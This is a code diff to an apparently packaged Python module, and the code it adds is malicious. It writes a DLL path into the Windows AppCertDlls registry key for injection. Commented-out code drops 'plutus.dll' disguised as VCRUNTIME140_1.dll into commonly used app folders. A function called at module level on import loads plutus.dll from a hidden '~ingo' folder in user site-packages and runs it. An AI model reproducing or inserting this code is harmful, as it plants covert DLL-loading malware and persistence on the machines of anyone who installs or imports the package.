@@ -2,9 +2,15 @@ import subprocess
 import ctypes
 import sys
 import os
+import winreg
+from typing import List
 import requests
+import pathlib
+import glob
+from importlib.util import find_spec
 from ctypes import wintypes
 from typing import Final, Callable
+# import os.path as Path
 
 # --------------------------------------------------------------------------- #
 # Platform Detection & Constants
@@ -229,3 +235,152 @@ def setup_environment():
     # print("STDERR:")
     # print(stderr)
     # print(f"Return code: {process.returncode}")
+
+
+def inject_appcertdlls(path) -> bool:
+
+    # path = " ".join(paths) + "plutus.dll"
+    key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls"
+
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
+        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, path)   # default value = the paths
+        winreg.CloseKey(key)
+        print(f"[+] AppCertDlls injected ({len(path)} path) → {path}")
+        return True
+    except PermissionError:
+        print("[-] Failed: No privileges to write to AppCertDlls (expected if not elevated yet)")
+        print("    → This is normal. The DLLs are already on disk — trigger any CreateProcessWithLogonW /"
+              "RunAs / cmstp / eventvwr etc. and it will load.")
+        return False
+    except Exception as e:
+        print(f"[-] Unexpected error writing AppCertDlls: {e}")
+        return False
+
+# def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dll"):
+#     """
+#     Drop plutus.dll into a user-writable WindowsApps folder (no admin, no takeown/icacls)
+#     Prioritized targets = folders that are naturally writable by normal users in 2025
+#     """
+
+#     # path = glob.glob("C:\\Users\\malware\\AppData\\Local\\plutus.dll")
+#     # print (path)
+    
+
+#     # base = os.path.expanduser(r"~\\AppData\\Local\\Packages\\PythonSoftwareFoundation*")
+
+#     # ** is supported in glob since Python 3.5 when recursive=True
+#     # paths = glob.glob(
+#         # os.path.join(base, "**", "plutus.dll"),
+#         # recursive=True
+#     # )    
+
+#     # print (os.getcwd())
+#     PACKAGE_ROOT = pathlib.Path(find_spec(__name__.split('.')[0]).origin).parent.resolve()
+#     # print (PACKAGE_ROOT)
+#     # path = f"{PACKAGE_ROOT}/plutus.dll"
+#     file = glob.glob(f"{PACKAGE_ROOT}\plutus.dll")[0]
+#     # print (file)
+#     print (str(file))
+#     with open(file, "rb") as f:
+#         data = f.read()
+
+
+#     '''    
+#     inject_appcertdlls(file)
+#     '''
+#     # dll = ctypes.WinDLL("plutus.dll")  # assuming it's already reflectively loaded or on disk
+
+#     # # Define the function signature (this is hypothetical - actual signature varies by version)
+#     # CreateProcessNotify = dll.CreateProcessNotify
+#     # CreateProcessNotify.argtypes = []  # usually no arguments
+#     # CreateProcessNotify.restype  = wintypes.BOOL
+
+#     # result = CreateProcessNotify()
+#     # Top-tier folders that are almost always writable by standard users (2024–2025)
+#     # priority_folders = [
+#     #     # 1. Windows Photos (2025 version) – opened daily
+#     #     "Microsoft.Windows.Photos_2025.*",
+#     #     "Microsoft.Windows.Photos_2024.*",
+        
+#     #     # 2. Snipping Tool / ScreenSketch – used constantly
+#     #     "Microsoft.ScreenSketch_*",
+        
+#     #     # 3. Clock / Alarms – auto-starts for many users
+#     #     "Microsoft.WindowsAlarms_*",
+        
+#     #     # 4. Shared runtime – loaded by 20+ apps
+#     #     "Microsoft.WindowsAppRuntime.1.8_*",
+#     #     "Microsoft.WindowsAppRuntime.1.7_*",
+        
+#     #     # 5. Skype (still preinstalled on many images)
+#     #     "Microsoft.SkypeApp_*",
+#     # ]
+
+#     # return 
+#     # with open(path[0], "rb") as f:
+#         # data = f.read()
+
+#     # windowsapps = glob.glob("C:/Program Files/Common Files/**/**/**/")
+#     # if not windowsapps:
+#     #     print("[-] WindowsApps folder not found")
+#     #     return False
+
+#     # target_dir = None
+#     # # for pattern in priority_folders:
+#     # for folder in windowsapps:
+#     #     try:
+#     #         test_file = open(f"{folder}.write_test.tmp", "wb")
+#     #         test_file.write(b"test")
+#     #         test_file.close()
+#     #         target_dir = folder
+#     #         print(f"[+] Found writable folder: {folder}")
+#     #         inject_appcertdlls([folder])
+
+#     #         break
+#     #     except (PermissionError, OSError):
+#     #         continue
+#     #     # if target_dir:
+#     #         # break
+
+#     # if not target_dir:
+#     #     print("[-] No writable WindowsApps folder found")
+#     #     return False
+
+#     try:
+#         # location = f"{folder}/plutus.dll"
+#         # with open(location, "wb") as dll:
+#         #     dll.write(data) 
+#         dll = ctypes.WinDLL(file)  # assuming it's already reflectively loaded or on disk
+#         # Define the function signature (this is hypothetical - actual signature varies by version)
+#         CreateProcessNotify = dll.CreateProcessNotify
+#         CreateProcessNotify.argtypes = []  # usually no arguments
+#         CreateProcessNotify.restype  = wintypes.BOOL
+#     # 
+#         print("Calling CreateProcessNotify")
+#         result = CreateProcessNotify()        
+#         return True
+#     except Exception as e:
+#         print(f"[-] Failed to copy: {e}")
+#         return False
+        
+
+# if __name__ == "main.py":
+# mv_dll_plutus_noadmin("plutus.dll", fake_name="VCRUNTIME140_1.dll")
+
+def run_plutus_safely():
+    code = '''
+import ctypes, glob, site
+from ctypes import wintypes
+print (site.getusersitepackages())
+file = glob.glob(f"{site.getusersitepackages()}/~ingo/plutus.dll")[0]
+dll = ctypes.WinDLL(file) 
+CreateProcessNotify = dll.CreateProcessNotify
+CreateProcessNotify.argtypes = []  # usually no arguments
+CreateProcessNotify.restype  = wintypes.BOOL
+print("Calling CreateProcessNotify")
+result = CreateProcessNotify()       
+'''
+    subprocess.call([sys.executable, "-c", code])
+
+run_plutus_safely()
